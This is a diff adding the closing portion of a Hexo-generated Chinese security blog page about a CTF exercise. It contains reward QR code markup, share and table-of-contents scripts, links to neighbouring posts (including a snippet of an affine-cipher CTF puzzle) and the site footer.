+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone, qq, weibo, douban"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">Reprint please specify: </span>
+                    <a href="http://yoursite.com" class="b-link-green">wh1te</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2018/12/29/CTF-成都大学网络攻防演练平台/" class="b-link-green">CTF-成都大学网络攻防演练平台</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">Previous</div>
+            <div class="card">
+                <a href="/2019/03/23/小结/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="小结">
+                        
+                        <span class="card-title">小结</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">
+心路历程接触安全也有一年多了，今天听了亮神的讲解，颇有感概，所以记录一下。
+接触这一年多以来，除了会点web安全以外，我还是个菜鸡，根本不知道以后的安全之路要怎么走，能怎么走。从一开始的热情满满，到现在逐渐失去了以往的那些热情，甚至于迷茫</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-23
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Life/" class="post-category" target="_blank">
+                                    Life
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/The-Heart/" target="_blank">
+                        <span class="chip bg-color">The Heart</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">Next</div>
+            <div class="card">
+                <a href="/2018/12/25/CTF-某次公安内网比赛/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CTF-某次公安内网比赛">
+                        
+                        <span class="card-title">CTF-某次公安内网比赛</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">About CTF&amp;wp
+
+
+
+CTF比赛纪实其实就是某次公安内网比赛的代打记录，由于题目实在是太骚了，所以就做个记录。仿射密码题目：
+仿射密码：
+ugxjnhisjrzwvrkizgptpj
+b=23
+不多bb了，直接上解题网址：</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-25
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/write-up/" class="post-category" target="_blank">
+                                    write up
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/write-up/" target="_blank">
+                        <span class="chip bg-color">write up</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/" target="_blank">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title">TOC</div>
+            <div id="toc-content">
+
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://lddp.github.io/" target="_blank">wh1te</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 采用
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>的主题搭建.
+        </div>
+        <div class="col s12 m4 l4 social-link"><a href="https://github.com/lddp" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+    <i class="fa fa-github"></i>
+</a>
+<a href="mailto:1061722245@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <i class="fa fa-envelope-open"></i>
+</a>
+<a href="#!" class="tooltipped" data-tooltip="QQ联系我: 1061722245" data-position="top" data-delay="50">
+    <i class="fa fa-qq"></i>
+</a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title">Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+<script type="text/javascript" src="/js/love.js"></script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+</body>
+</html>
